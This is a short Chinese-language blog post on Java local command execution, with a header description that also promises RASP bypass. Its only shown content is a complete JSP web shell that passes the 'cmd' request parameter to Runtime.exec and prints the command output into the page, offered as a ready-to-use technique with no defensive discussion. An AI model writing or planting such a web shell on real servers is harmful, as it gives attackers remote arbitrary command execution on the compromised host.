---
layout: post
title: java本地命令执行
categories: [blog ]
tags: [Java,]
description: "本地命令执行以及绕过rasp"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.compu
---















## 普通的命令执行

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.Writer" %>
<html>
  <head>
    <title>$Title$</title>
  </head>
  <body>
 <%
 InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
 ByteArrayOutputStream baos=new ByteArrayOutputStream();
 byte[] b=new byte[1024];
 int a=-1;
 while((a=in.read(b))!=-1){
   baos.write(b,0,a);
 }
   out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
 %>
  </body>
</html>

```

